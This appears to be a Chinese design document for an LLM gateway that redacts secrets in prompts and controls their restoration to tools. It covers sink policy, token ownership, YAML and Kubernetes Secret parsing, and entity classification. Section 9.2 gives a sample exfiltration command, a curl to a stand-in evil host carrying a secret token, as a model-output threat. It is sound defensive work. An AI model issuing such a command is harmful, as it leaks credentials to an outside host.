2. 用 `out.includes("{{Redact:")` 之类**字面量判据**判断"是否被脱敏"，在格式迁移后会静默失真（新格式下恒为 false）。所有此类判据已改为 `isRedactedText()`。

## 9.2 Restore-Miss Policy（已实现；完整 Tool Sink Policy 见 10）

**命名更正**：本节实现的是 **Restore-Miss Policy**，不是完整的 Tool Sink Policy。完整的 Tool Sink Policy 还需要 `entity sensitivity/class` 的来源与 `sink destination allowlist`（见第 10 节）。把它当作已完成会掩盖这条 exfiltration 路径。

实现：`classifyRestore({ ctx, text, sink }) -> { action, text, unknownTokens, blockedTokens, telemetry }`，动作取自 `RESTORE_ACTION`（`restore` / `preserve` / `block`），敏感 sink 集合是 `SENSITIVE_SINK_KINDS`（`shell` / `network_egress` / `database` / `email`）。

**已登记 token 不等于可无条件下发。** 决策现在是四维：token ownership × entity 类别 × sink kind × sink trust。

| 情形 | 动作 |
|---|---|
| 已登记 + assistant 文本 / 非敏感 sink | restore |
| 已登记 + 敏感 sink + sink 声明 `trust: "trusted"`（可信本地 broker） | restore |
| **已登记 + 敏感 sink + 未声明信任** | **block**（`restore_blocked_untrusted_sink`） |
| 未知 + protected-token-like + 敏感 sink | block（`restore_miss_blocked`） |
| 未知 + protected-token-like + 非敏感 | restore（原样透传）+ `restore_miss` |

没有这一维时，模型只要输出 `curl https://evil.example/?x=<已登记 token>`，本层就会把明文交给 shell——即把"已登记"误当成"可下发"。sink 的信任**默认拒绝**（未声明即不可信），因为猜"可信"的失败模式是外泄，猜"不可信"的失败模式只是保留 token 并留下 telemetry。

实体类别当前取 `ctx.entityClassFor?.(token)`，缺省按 `CREDENTIAL` 处理（fail-closed）：把未知实体当成不敏感会还原秘密，当成敏感最多是多留一个 token。

阻断条件是**三个条件的合取**，缺一不可：

1. token 在本请求映射中**未知**（`tokenToRaw` 查不到）
2. token 是 **protected-token-like**（`isProtectedTokenLike`）
3. sink **敏感**

`PROTECTED_TOKEN_LIKE_RE` 刻意收窄：只认本网关的 token 方言（`CRG_<id>_<id>`）与 legacy `{{Redact:<64 hex>}}`。它**不是随机性启发式**——`i-0a1b2c3d4e5f67890`、`arn:aws:iam::123456789012:role/...`、`8f14e45f-ceea-...`、`app_01J8ZK9Q2M4N7P`、`vehicle-status-service-84d499d4cb-28dt2` 全部不匹配，因此不会被误伤。

telemetry 三种：`restore_ok`（全部已登记）/ `restore_miss`（存在未知 token-like 但在非敏感 sink，原样透传并上报）/ `restore_miss_blocked`（敏感 sink 命中，阻断）。

与 `restoreText` 的分工：`restoreText` 只做映射查找，不改行为；策略层独立判定。既有语义（未知 token 原样透传）因此保持不变，策略是**附加**判定而不是替换。

## 9.3 Namespace ownership（已实现）

三分法，由 `classifyOwnership(token, ctx, registry)` 给出：

| 归属 | 判定依据 | 本层行为 |
|---|---|---|
| `OWN` | `ctx.tokenToRaw.has(token)` | restore，但受 sink policy 约束（见 9.2） |
| `FOREIGN_REGISTERED` | 已登记 namespace 命中 **且** token 形状合法 | **永不 restore、永不改写**；敏感 sink 且 sink 未声明 trusted 时 **block** |
| `UNKNOWN` | 其余 | 普通文本 preserve + telemetry；敏感 sink block |

**为什么 FOREIGN_REGISTERED 在敏感 sink 里也要 block**：外层 DLP 正是在那里把明文替换回去。放行等于把 exfiltration 路径从"本层还原"换成"外层还原"，风险不变。

**为什么 matcher 不能宽泛**：namespace 是**可信配置**，不是 payload 派生数据。若把"长得像 `CRG_*`"一律当外来可信，控制 payload 的人就能把自己的文本声明成外来从而绕过全部检测——正是 `isProtectedToken` 要堵的那个 bypass。因此：

- 前缀 namespace：matcher 命中 **且** token 形状合法（`FOREIGN_TOKEN_SHAPE_RE = /^[A-Z][A-Z0-9]*(?:_[A-Z0-9]+)+$/`）。形状里不含 `- : . 空格`，所以 `i-0a1b2c3d4e5f67890`、`arn:aws:iam::…`、UUID、release 名**即使 matcher 写成 `.*` 也claim不到**。
- 精确登记（`registerTokens`）：本身就是显式信任决定，**不再受形状约束**，用于没有可控前缀形状的 issuer。

已知覆盖缺口（显式测试记录，不当作已解决）：未登记的外来 token 若其形状不是本层方言，则既不匹配 `REDACTED_TOKEN` 也不匹配 `PROTECTED_TOKEN_LIKE_RE`，UNKNOWN 分支看不到它。真正的修法是让各 provider 规则识别常见 DLP 形状，属 D 组之后的工作。

## 9.4 测试断言的两个陷阱（迁移期实测）

1. **`isRedactedText` 是形状判定，不是"发生过敏删"的判定。** 对本身就长得像 token 的输入（如 `API_KEY=CRG_AAAAAAAA_0001`）它返回 `true`，即使一个字都没改。凡是想表达"是否被脱敏"的断言，必须比较输入与输出，不能只用这个谓词——否则会写出自指的假绿断言。
2. **`assert.match(x, 全局正则)` 不可用**，理由见 9.1。

## 9.5 Structured Context：D1 assignment family（已实现）

**解析器是证据生产者，不是脱敏器。** 它只定位 raw value span 并把字段名报上来，最终的 span merge 仍由统一流程决定。**不 unquote、不 decode、不 normalize**：span 只覆盖引号**内部**，`KEY="` 与结尾的 `"` 原样保留。否则结构化提取层自己就开始改宿主语法了。

D1 覆盖的绑定形式：`.env` 赋值、shell `export KEY=value`、带空格的 `KEY = value`。

统一记录形状（后续 D2/D3 的 adapter 只负责产出同样的 evidence，不各自 redact）：

```js
{ kind: "binding", key, normalizedKey, valueStart, valueEnd,
  syntax: "env" | "shell", evidence: [...], strength }
```

`evidence` 取值：`structured_binding`、`strong_secret_key`、`quoted_value`、`reference_value`。

**key 强弱分档**（裸 `key` 刻意留弱）：

| 档 | 例 |
|---|---|
| strong | `password` `passwd` `passphrase` `secret` `token` `credential` `api_key` `access_key` `secret_key` `private_key` `client_secret` `auth_token` `signing_key` `encryption_key` |
| weak（inert） | 裸 `key`、`*_key`、`cache_key` `partition_key` `sort_key` `map_key` `primary_key` `foreign_key` `group_key` `shard_key` `build_key` `routing_key` `dedupe_key` |

**reference value 不当作字面秘密**：`$VAR`、`${VAR}`、`{{ tpl }}`、`{var}`、`%VAR%`、`<var>` 会被标记 `reference_value` 并排除出 span —— 把模板替换成 token 会破坏宿主文件。

**fail-open 的解析语义**：解析失败或不匹配只贡献 0 个 span，**不 suppress `G`/`H`/其它 detector、不提前返回**。已用开关对照测试固定归因：`structuredContext: false` 时旧漏报复现。

分片计划：

| 片 | 范围 | 状态 |
|---|---|---|
| D1 | assignment family（`.env` / `export` / 空格赋值） | 已实现 |
| D2 | YAML scalar binding（`key: value`、`data:\n  key: value`） | 待做 |
| D3 | `Authorization`/HTTP header + URL query（`?access_token=`） | 待做 |

每片自带 positive / negative / bounds / round-trip 断言。`entityClassFor` 的分类器不混进这些片，D 结束后单独一刀。

## 9.6 D1.1 共享 evidence 层加固（已实现）

三项都是 D2 及之后的 adapter 会直接复用的层，所以在开 D2 之前先钉住。

### 9.6.1 key 语义边界

`classifyKeyStrength` 原先是 pure substring match，进入 YAML 后误删面会放大。现在：

- **归一化先切 camelCase**（`secretName` → `secret_name`、`secretKeyRef` → `secret_key_ref`、`passwordHash` → `password_hash`）。K8s 字段绝大多数是 camelCase，不切则元数据规则永不触发。
- **元数据后缀降级**：`_name _path _file _dir _uri _url _ref _reference _id _type _kind _class _label _annotation _key _keys _hash _digest _checksum _policy _profile _provider _store _source _field _var _env _length _size _format _algorithm _version _expiry _ttl _rotation _manager _backend _engine` 结尾 ⇒ `WEAK`。
- **判定是后缀式**：`password_hash` 指派生值、`secret_name` 指位置；而 `password_value`（强词在前）仍是强。
- **canonical 白名单优先**：`api_key` / `access_key` / `secret_key` / `private_key` / `signing_key` / `encryption_key` / `session_key` / `master_key` / `client_key` / `access_token` / `client_secret` … 先于元数据规则判定，否则 `api_key` 会被自己的 `_key` 后缀降级。
- **`public_key` 刻意不属于秘密**：公钥不是秘密，但同属 `*_key` 命名族，纳入只会扩大误删面。

### 9.6.2 containment-aware merge（修正 redaction bounds 漏洞）

原 merge 是「高优先级先占位、overlap 即丢弃」，存在**边界丢失**：

```
DB_PASSWORD="prefix <PAT> suffix"
             └──── binding span（整个 value）────┘
                   └── 更窄的 provider hit ──┘
```

窄 hit 因优先级胜出，包含它的 binding span 被作为 overlap 丢弃 ⇒ **只遮住 PAT，密码剩余部分继续明文暴露**。实测复现：输出 `DB_PASSWORD="prefix CRG_… suffix"`。

修法：

- 外层 span **吸收**内部更窄的 hit，**redaction bounds 由更宽的 strong binding 决定**，同时把内部 hit 的类型并入 `evidence`；
- **归因归最具体的 hit**：内部 provider 规则（`gitleaks`）继续命名该秘密（`type` = `gitleaks`，`providerType` = `binding`），否则会有 `ruleId` 被丢；
- **被吸收的 span 不得再单独 emit**：合并项继承了它的 type 与 priority，两者同时在场时窄的那个可能赢下 overlap 竞争，等于把 bug 又装回去；
- 同类型同边界的重复项不记为 absorbed（否则元数据自指）。

### 9.6.3 reference 形式

`REFERENCE_VALUE_RE` 补齐 **GitHub Actions `${{ secrets.X }}`**（贪婪匹配，否则内层 `}` 会提前终止、把 `${{` 当字面秘密）与**命令替换 `$(cmd)`**。

`$(...)` 明确按 **reference / expression** 处理，不作为字面秘密：`$(cat /run/secrets/pw)`、`$(vault kv get -field=password …)` 本身就是"不把秘密落盘"的正确做法，替换成 token 反而破坏这层间接。

另外修了一个相关缺陷：**未闭合引号**（截断日志、流式 delta 被切断）会把开引号吞进 value span，导致替换后出现 `KEY=""ABCDEFG…`。

## 9.7 D2a：简单 YAML block-mapping scalar（已实现）

范围刻意收窄，只处理：

```yaml
password: xxx
password: "xxx"
password: 'xxx'
```

**不处理**（D2b/D2c）：block scalar（`|` `>`）、sequence、flow style（`{}` `[]`）、anchor/alias/tag、multi-document、非 scalar 值。

### 结构上下文：hint，不是事实

D2a 维护 indentation stack 并产出：

```js
{ syntax: "yaml", key, valueStart, valueEnd, indent,
  pathSegments: ["data", "password"],
  pathConfidence: "simple-mapping" | "unknown" }
```

`pathConfidence` 只有两档。遇到不建模的结构时：

- **路径退化**：`pathConfidence = unknown`、`pathSegments = []`，并追加 `path_unknown` evidence；
- **但该行仍然被解析**——跳过整行会停止检查 sequence item 里的秘密，那是 fail-open。

**`pathSegments` 不得当作 schema path 使用。** D2c 必须写成对象级 recognizer：

```
apiVersion == v1  AND  kind == Secret  AND  path under root `data`   → base64 representation
apiVersion == v1  AND  kind == Secret  AND  path under root `stringData` → 普通 string token
```

仅凭 `path === data.password` 就判 base64 是错的（普通应用配置同样可以有 `data.password`）。测试 `pathSegments is a hint, not a schema path` 固定这个契约。

### 其他实现要点

- **引号只作定界符**：span 圈引号内部，`password: "` 与结尾 `"` 原样保留。
- **key 清洗**：锚点/别名/标签/引号从 key 中剥离（`- &a password: x` 的 key 必须是 `password`，否则强度判定失效、绑定静默失效）。
- **偏移以原始行为准**：先前用"去掉行尾空白后的长度"计算 `restStart` 而未计入该差值，导致每个 span 偏移 1 字符、值首字符被吞。
- **已知限制（显式测试）**：plain scalar 后的 ` # comment` 目前仍留在 raw value 内。不裁剪是有意的——裁剪属于改写宿主语法；目标是 D2b 处理。

分片状态：

| 片 | 范围 | 状态 |
|---|---|---|
| D1 | assignment family | 已实现 |
| D1.1 | 共享 evidence 层加固 | 已实现 |
| D2a | 简单 YAML scalar mapping | 已实现 |
| D2b | block scalar / 注释裁剪 | 已实现 |
| D2c | K8s Secret schema + base64 surrogate | 已实现 |
| D2c.1 | ownership hardening（shape ≠ ownership） | 已实现 |
| D2c.2 | surrogate policy convergence | 已实现 |
| D3a | 粘贴的 HTTP header | 已实现 |
| D3b | URL query raw-span | 已实现 |
| D3c | JSON `url` 字段覆盖 | 已实现 |

**structured-context D 组全部收口**（162 tests / 162 pass）。

## 9.8 D2b-1 / D2b-2（已实现）与 D2c 基线

### 9.8.1 D2b-1 plain scalar 注释边界

**更正一个此前写错的口径**：把 ` # comment` 留在 raw value 内**不是**"为了避免改写宿主语法"，恰恰相反——**那才会改坏宿主内容**：redaction 会把注释连同值一起吃掉，且 restore 无法逐字节还原。

正确规则（YAML 词法）：**只有前置 separation whitespace 的 `#` 才开始注释**。

```
password: abc#123          # `#` 属于值
password: abc123!  # note  # 注释，span 只覆盖 abc123!
```

实测：注释与其前的空白均保留，`round-trip` 逐字节一致；引号内的 `#` 不受影响。

### 9.8.2 D2b-2 block scalar

识别指示符族：`|` `|-` `|+` `>` `>-` `>+` 以及显式缩进指示符的**两种顺序**（`|2+` 与 `|+2`）。body 定位遵循 YAML 9.1.1：内容缩进由首个非空行决定，块在首个缩进更小的非空行结束。

**关键实测结论（措辞已修正）：要求不是"禁止跨行 span"，而是"replacement 必须维持 block scalar 的缩进与结构"。**

把一个多行体替换成**单个无缩进的 token** 会产生非法 YAML（PyYAML `ScannerError: while scanning a simple key`），四种形态实测全部失败。但**从首行内容开始、覆盖整个块体的 provider span 是可行的**——它替换后仍带有首行的缩进，YAML 依然合法，这也是 provider 规则（PEM 的 BEGIN..END）实际在做的事。真正会坏的是**跨越行边界却只覆盖部分块体**的 span：它会把值切成半行，缩进结构随之破坏。

所以实现上：

- 块体每一行**各自成为一个候选**（`block_scalar_body`），每行缩进留在 span 之外；
- 完整覆盖块体的 provider span 允许胜出（YAML 合法性由"首行缩进被保留"保证）；
- 弱键下不产 span，由内容检测器决定（见 9.9）。

实测验证（13 种形态，真实 PyYAML 解析 + restore 逐字节比对）：全部输出仍是合法 YAML，且 round-trip 全部一致，包含 `|`/`|-`/`|+`/`>`/`|2`/`|+2`/`|-2`、嵌套块、空行、注释、`abc#123`、同一文档两个块。

### 9.8.3 三个偏移 bug（都是"看起来对、实测错"）

写这一段代码时连续踩了三个**静默偏移**错误，全部由真 YAML 解析器和 round-trip 断言抓出，靠阅读代码是发现不了的：

1. `startOfLine(idx)` 用 `lines.slice(0, idx).reduce((n, l) => n + l.length + 1, lineStart)`，而 `lineStart` 本身已是当前行的前缀累计长度 ⇒ **每行前缀被加了两次**，所有 span 前移。改为预计算 `lineOffsets[]`。
2. 逐行候选里 `lineText.indexOf(lineBody, lineIndent)` 返回的是**行内相对偏移**，再加 `lineStartOffset` 相当于把缩进算了两遍。
3. 早期版本用"去尾空白后的长度"算 span 末尾，未计入尾部空白差值，导致 span 越过行尾、吞掉下一行开头。

### 9.8.4 D2c K8s Secret schema + base64 surrogate（已实现）

此前的缺口：D2a/D2b 会把 `Secret.data.*` 替换成普通 portable token，对 YAML 合法、对 Kubernetes 非法（API server：`illegal base64 data`）。现已修复。

**对象级判据**（不是 path 判据）：

```
apiVersion == v1  AND  kind == Secret  AND  path under ROOT `data`
```

`ConfigMap`、缺 `apiVersion`、`apiVersion: v2`、泛型 `data:`、以及**嵌套 `spec.data`** 全部不走 base64。最后一条尤其重要：注释里写了"仅根键"但最初没有实现该检查，测试 `only a v1 Secret gets the base64 surrogate` 把它抓了出来。

**surrogate ledger**（见 9.8.4a）让回程可用：`restoreText` 按**形状**识别 token，base64 编码后的 token 对它是不可见的，因此可见的 surrogate 必须在 ledger 中显式登记，且**只对本次请求铸造过的串**尝试查找——解码任意 base64 文本会带来大得多的误伤面。

设计决定（四项）：

| 决定 | 取值 | 理由 |
|---|---|---|
| surrogate 长度 | 长度无关（`base64(token)` 最短） | K8s 只校验能否解码，不校验解码后长度；避免为长度而填充 |
| sink policy | surrogate 与普通 token **同等对待** | `classifyRestore` 把 ledger 中的 surrogate 归一到 underlying token，复用现有四维判定，不引入第二套规则 |
| `entityClassFor` | 继续留空，UNKNOWN → credential 级 fail-closed | 与 B 组约定一致，分类器留到 D 之后单独一刀 |
| 恢复边界 | **只在 ledger 登记的 surrogate 上**查找 | 精确匹配整串；未登记的 base64 一律不碰 |

**结构 hint 必须随证据一起在 merge 中继承**：provider 规则常以更高优先级赢下 span 边界，若 merge 只传 `evidence` 不传 `pathSegments`，对象级 recognizer 就拿不到路径（`data.password` 的 span 归于 `gitleaks` 时不含 path）。已修复。

**等边界归并**：provider 规则与 binding 对同一秘密常产生**完全相同的边界**。containment 遍历刻意跳过等边界对，因此若不先做等边界归并，其中一方会被整体丢弃——若丢的是 binding，路径随之消失，对象级 recognizer 静默失效。

**端到端验证**（真实 minikube API server）：

```
脱敏后 data.password = Q1JHX0hDVTZDQV8wMDAx   → kubectl apply --dry-run=server: created ✅
restoreText(out) === 原文                      → 逐字节一致 ✅
username（弱键）保持原样                        → 未过度脱敏 ✅
```

#### 9.8.4b D2c.1 ownership hardening（安全回归修复）

在为"外来 token 透传"修 bug 时引入了一个**安全回归**：binding 层按**形状**跳过任何看起来像本层 token 的值，注释里还写着"资格仍由 merge 阶段的 ownership 决定"——但候选根本没到 merge 阶段，所以那句话是假的，口子是真开的。

```
DB_PASSWORD=CRG_AAAA_AAAA
```

`CRG_AAAA_AAAA` 完全可能就是一个真实的低熵密码。binding 候选被形状过滤掉，`H` 不会抓（熵不够），generic `G` 也大概率不抓 ⇒ **明文出网**。

**同一个错误有三份副本**，全部已修：

| 位置 | 错误 |
|---|---|
| `bindingSpansOf()` | 按形状过滤候选（已删除） |
| `RedactionContext.emit()` | `TOKEN_FULL_RE.test(match) ? match : tokenFor(match)`，把任意 token 形状字面量当已铸 token 直通 |
| legacy 过渡豁免 | 见下方"已知过渡缺口" |

**统一规则**：

```
OWN                 → preserve
FOREIGN_REGISTERED  → preserve
UNKNOWN token 形状  → 不享受任何豁免；strong binding / G / 其它 detector 命中即正常脱敏
```

**输入方向的 ownership 也与回程统一**：此前 `ForeignTokenRegistry` 只接在 `classifyRestore()` 上，输入 redaction 路径并未用它决定 foreign ownership——B 组测的是回程透传，不等于已支持 `input → model_visible`。现在 `RedactionContext` 接受 `foreignRegistry`，`isProtectedToken` 统一判定 own / registered-foreign；registry 的 token 与 namespace 命中也会作为候选进入 merge，由**同一个** ownership 过滤器决定去留。精确登记（`registerTokens`）本身即信任决定，不再受形状检查约束（与 `classifyOwnership` 同一规则）。

**~~已知过渡缺口~~【已解决，见 9.22】** ~~legacy `{{Redact:<64 hex>}}` 形状在输入方向**仍被豁免**~~，因为 v1 token 没有 request-local namespace，无法对照 mapping 校验。后果是与刚修掉的 v2 口子同形的绕过：任何人写一个 `{{Redact:<64 hex>}}` 就能让该值跳过。移除条件已在 9.1 写明——删除 legacy restore 分支时一并去掉，测试 `KNOWN TRANSITIONAL GAP` 会在那时失败提醒。**G3 已执行该移除**：整个方言从生产代码删除，该测试改为"gap 已关闭"。

#### 9.8.4a surrogate 与本层方言的交互

`CRG_` 形状的值是否透传，**只由 ownership 决定**（见 9.8.4b）。早期版本在 binding 层按形状跳过，那是安全回归，已删除。

## 9.10 D2c.2 surrogate policy convergence（已实现）

`classifyRestore()` 曾给 surrogate 留了一个**独立快捷分支**（敏感 sink + untrusted → 无条件 BLOCK）。那不是"与 underlying token 同等对待"：等 `entityClassFor` 真接进来后，被判成 `INFRA` 的实体，其普通 token 会按 entity policy 走，而 base64 surrogate 仍会被无条件阻断——两条路径漂移。

**修法**：删掉快捷分支。

- `resolveSurrogate(value, ctx)` 把可见 surrogate 解析为 underlying token；
- `classifyOwnership` 在**解析后的 token** 上判定，因此 ownership / entityClass / entity policy 全部针对实体而非其表示形式；
- surrogate 仍被显式遍历（base64 不是 CRG 形状，`REDACTED_TOKEN` 找不到它），但走**同一条** ownership × entityClass × sink × trust 判定。

回归用例含一条关键断言：把 `entityClassFor` 临时改成返回 `INFRA` 后，**surrogate 与普通 token 必须给出相同动作**——这正是"没有残留快捷分支"的证明。

## 9.11 D3 粘贴的 HTTP header 与 URL query（已实现）

### 两个层级必须分开

| 层级 | 处理 |
|---|---|
| **粘贴进 prompt 的 header 文本**（`Authorization: Bearer <secret>`） | **脱敏** |
| **网关发给 upstream 的传输头**（`filteredRequestHeaders()` 构造） | **原样转发**，上游需要真实凭据认证；该路径根本不经过文本脱敏 |

测试同时固定两侧：粘贴文本被脱敏，且传输头的 `Authorization` / `x-api-key` / provider 头**必须逐字保留**——否则一次错误的"加固"会打断所有已认证调用。

### URL：raw span，不 decode 不 re-encode

只替换 query value 的原始 span。百分号转义、`+`、参数顺序、重复参数、fragment **全部逐字节保留**；decode → 修改 → re-encode 会把这些静默规范化掉。query **名**允许 decode 后匹配（`access%5Ftoken`），**值**一律保持原样。敏感名集合：`access_token` `auth_token` `api_key` `key` `secret` `client_secret` `password` `token` `credential` `signature` `sig` `x-amz-*` `sas` `code` 等；非敏感参数（`page` `limit` `q` `sort`）不动。

### D3c：JSON `url` 字段不再被整串跳过

`shouldSkipString()` 原先对任何 `url` / `image_url` 键直接 `return true`，字符串**根本到不了 `redactText`**：

```json
{"url": "https://api.example.com/?access_token=SECRET"}   → 原样转发
```

现在只跳 `image_url`（它常承载 base64 data URL，不是文本），普通 `url` 字段照常扫描，由 URL query 解析器产出 raw span。嵌套的 `image_url.url` 也会被扫描出 query 秘密。

### 实现期修正

header 的 `valueStart` 最初用多个长度相减推算，得到**负偏移**（尾部空白差值与值长度相减顺序错误），输出出现重叠。改为**锚定值本身**（`line.lastIndexOf(secret)`）——header 的秘密就是行尾值，最后一次出现即 span。

## 9.12 Parser coverage（已实现，仅可观测）

**度量单位是 parser attempt，不是"没解析的字节数"。** 后者会让每句自然语言都成为 UNKNOWN，指标失去意义。attempt = parser 能识别、因而有义务定位的结构。

| 状态 | 含义 | 计入 UNKNOWN |
|---|---|---|
| `PARSED` | 结构被识别且完整定位 | 否 |
| `PARTIAL` | 识别到容器/绑定起点，但存在未建模部分（YAML path 退化、shell 引号形式等） | 否 |
| `FAILED` | 有足够证据触发尝试，但无法安全定位 | **是** |
| `NOT_APPLICABLE` | 根本不像该格式（普通自然语言） | 否，且**完全不记录** |

### 遥测内容（不含原文）

```js
{ parser: "yaml"|"env"|"shell"|"header"|"url",
  status: "PARSED"|"PARTIAL"|"FAILED",
  regionStart, regionEnd, bytes, jsonPath? }
```

**不记录原始内容**——只有偏移、状态、计数。测试断言 coverage 输出中不出现秘密、键名或任何片段。

### 请求级汇总

`RedactionContext.coverageSummary()` 返回 `attempted_regions` / `parsed_regions` / `partial_regions` / `failed_regions` / `attempted_bytes` / `located_bytes` / `unknown_bytes` / `byParser`。

**字节数对 region 做 union**，因此两个 parser 看同一段文本不会 double count；per-parser 计数仍分别统计（那里相加是有意义的）。测试断言 `attempted_bytes ≤ payload 长度`。

### "像某格式"的判据刻意收窄

否则指标会被散文淹没：

- header：需要**带连字符的头部名**或已知头前缀（`Error: connection refused` 不计）；
- YAML：需要**单个 token + 冒号**（`my key here: value` 不计）。

**已记录的语义边界**：`Error: connection refused` 会被 YAML parser 报为 `PARSED`，因为**它确实是合法 YAML**（`Error` 是键）。要求它不计入就等于要求 parser 谎报语法。真正承载信号的是 `unknown_bytes`——任何散文都不得进入 `FAILED`。

### 实测基线（8 份真实形态语料，1100 字节）

| corpus | bytes | att | parsed | partial | failed | attB | unkB |
|---|---:|---:|---:|---:|---:|---:|---:|
| K8s Secret 清单 | 114 | 8 | 8 | 0 | 0 | 107 | 0 |
| .env 文件 | 125 | 5 | 5 | 0 | 0 | 108 | 0 |
| Helm values | 170 | 8 | 8 | 0 | 0 | 154 | 0 |
| 粘贴 curl + header | 153 | 3 | 3 | 0 | 0 | 152 | 0 |
| 排错日志（含散文） | 250 | 3 | 3 | 0 | 0 | 142 | 0 |
| **纯散文** | 190 | **0** | 0 | 0 | 0 | **0** | 0 |
| 退化 YAML（sequence） | 98 | 5 | 2 | **3** | 0 | 94 | 0 |

UNKNOWN 占比 **0.00%**（该语料无不可定位形态），attempt 覆盖率 68.8%。纯散文 0 attempt、0 字节。

**第一刀只做可观测，不因 UNKNOWN 比例高而 block**。阈值/告警留待更多真实语料之后再定。

### 实现期修正

`unionBytes` 原以 `-1` 作哨兵，导致**从 0 开始的 region 永远不计入**，所有字节统计恒为 0；`summary()` 又把 `{regionStart,regionEnd}` 记录直接传给期望 `{start,end}` 的 `unionBytes`，过滤条件退化为 `undefined > undefined`。两处均已修，并加边界用例（重叠 / 相邻 / 乱序 / 从 0 开始）。

## 9.13 E0 + E1：entity class 语义与"只落账"的分类器

### E0 sink policy 的 entity class 语义（已修正）

`isCredentialRisk()` 的旧实现：

```
CREDENTIAL / UNKNOWN → true
PII / INFRA          → false
```

**这是个潜伏危险**：分类器一旦正确地把 email / 手机号 / 身份证 / 银行卡标成 `PII`，这些实体反而会**因为被分类正确而放行**到敏感 sink。已改为：

| class | 敏感 sink |
|---|---|
| `CREDENTIAL` | 保护 |
| `PII` | **保护**（本次修正） |
| `UNKNOWN` | 保护（fail-closed） |
| `INFRA` | 保持原有 policy —— 本刀**不借分类器顺手改**，留给 infra recognizer 那一刀 |

同时改名为 **`requiresSinkProtection()`**：该谓词从来不是只判断 credential。测试断言旧名 `isCredentialRisk` 已不存在。

### E1 分类器只落账，不改变 redaction verdict

**分类发生在 emit 时**——那时 span 的 `detector` / `ruleId` / `evidence` / `syntax` / `key` / `pathSegments` 都还在。等 `classifyRestore()` 再从 token 反推是猜。

```js
entityClassFor(token) { return this.entityLedger.get(token)?.entityClass ?? ENTITY_CLASS.UNKNOWN; }
```

落账条目：

```js
{ token, entityClass, detector, ruleId, evidence, strength, syntax, key,
  pathSegments, coverageStatus, encodingKind }
```

**第一版只做高置信度确定性映射**，不为覆盖率扩大误分类面：

| 证据 | class |
|---|---|
| `strong_secret_key` 绑定 / `http-header`（敏感头名） / provider 规则命中 / `sk-` / 私钥 | `CREDENTIAL` |
| `email` / `phone` / `identity` / `bank` detector | `PII` |
| entropy-only / 通用模糊命中 | `UNKNOWN` |
| **"看起来像资源 ID"** | **不判 `INFRA`** —— 留给 infra recognizer 正门产出 |

归因取**最具体的 detector**：`ruleId` 存在即记为 gitleaks；否则在 `type` 与 `absorbed` 中挑第一个非 `entropy`/`block_scalar` 的。这样 provider 规则赢下 span 边界时归因不会丢。

### 修正我之前的一个说法

我此前写过"实体来自 FAILED region，分类结果本身就不可信"——**这不能一概而论**：

```
parser FAILED + entropy-only                → 确实低可信
parser FAILED + 明确 GitHub PAT / PEM / 合法邮箱 → detector 本身依然很可信
```

`coverageStatus` 因此作为**独立证据维度**记录，**不参与降级确定性 detector**，也不与 class 揉成一个 confidence 数。Parser coverage 衡量的是"结构理解程度"，不是所有 detector 的可信度。测试 `a FAILED region does not downgrade a deterministic detector` 固定这条。

### 实测分类结果

```
CREDENTIAL  binding    key=DB_PASSWORD           cov=PARSED
CREDENTIAL  binding    key=API_KEY               cov=PARSED
CREDENTIAL  gitleaks   rule=github-classic-token cov=PARSED
CREDENTIAL  gitleaks   rule=private-key          key=private_key
PII         email / phone / identity / bank
UNKNOWN     entropy    （SHA-like 串）
```

另有一条值得记的实测：`cache_key: <base64>` **会**被判 `CREDENTIAL`——但归因是通用 provider 规则命中**值**，`key=null` 证明**不是 key 名给的**。这与"弱 key 名不授予 class"不矛盾：`cache_key: abc123` 完全不产生实体。测试同时固定这两点。

## 9.14 Infra Recognizer（已实现：recognizer 只分类，policy 才 preserve）

**recognizer 从不输出 action，从不 suppress，从不 preserve。** 它回答"这是什么"；独立 policy 层回答"拿它怎么办"。测试断言返回值里**不存在 `action` 字段**——一旦出现，说明两层又揉回成一个猜测。

```js
{ entityClass: "INFRA", infraType, evidence: [...], confidence, hard, disposition }
```

### disposition 与 preserve allowlist（第一版刻意极小）

| infraType | disposition |
|---|---|
| `GIT_SHA` / `OCI_DIGEST` / `TRACE_ID` / `SPAN_ID` | **preserve** |
| `AWS_ACCOUNT_ID` / `AWS_ARN` / `PRIVATE_IP` / `INTERNAL_HOSTNAME` / `K8S_RESOURCE_NAME` / `EC2_RESOURCE_ID` | mask（**仍然脱敏**） |

后一组虽然通常不是 secret，但在一些组织属于敏感基础设施元数据——**那个判断属于 profile，不属于模式匹配器**。测试断言 allowlist 恰好是这四项，防止以后顺手扩大。

### 单调风险（两半都必须成立）

```
HARD_SECRET 不可被 INFRA 降级      provider 规则 / 敏感 binding / email / phone / identity / bank 命中 → 一律 redact
SOFT_SIGNAL 可被高精度 INFRA 压制   entropy-only + hard 且 allowlisted 的 INFRA → preserve
```

`entropy` **刻意不在硬密钥集合里**：熵是这一刀要压制的软信号。把它算作硬密钥会让所有 preserve 决策不可达——与被它误放行同样糟。

### 上下文锚：歧义形状需要证据才能成为 hard

裸的定长 hex 无法自证身份，因此引入锚点。**无上下文时 soft、有上下文时 hard**：

| 形状 | 无锚 | 有锚 |
|---|---|---|
| 40-hex | `GIT_SHA` soft → **redact** | `commit <sha>` → hard → preserve |
| 32-hex | `TRACE_ID` soft → **redact** | `trace_id: <id>` → hard → preserve |
| 16-hex | **不 claim**（形状与银行卡相同） | `span_id: <id>` → hard → preserve |
| `sha256:<64hex>` | hard（形状本身无歧义） | — |

这条规则直接来自实测暴露的一个安全问题，见下。

### 实现期抓到的四个缺陷

**① 银行卡被当作 span id 释放（安全）**：`4111111111111111` 匹配 16-hex ⇒ 判 `SPAN_ID` ⇒ `hard` ⇒ **preserve**。双重原因：PII detector 未被算作硬密钥，且裸 16hex 形状歧义被当作 hard。修法：把 `email/phone/identity/bank` 纳入硬密钥集合 + 16hex 需锚点。

**② 宿主名规则灾难性回溯（ReDoS）**：嵌套量词 `(?:[a-z0-9-]*)*` 使一个 71 字符的 digest 分类**超过 60 秒**。改为非嵌套形式，并加压力测试（含 2000 字符敌对输入，断言总耗时 < 1s）。这类 bug 属于"静默挂死"，正是这一刀该防的。

**③ 私有 IP 只匹配两段式前缀**：`10` 需两段后续、`192.168`/`172.16-31` 需一段，共用一个尾部导致 **`10.244.0.11` 静默失配**而 `192.168.1.5` 正常。按段数分别写。

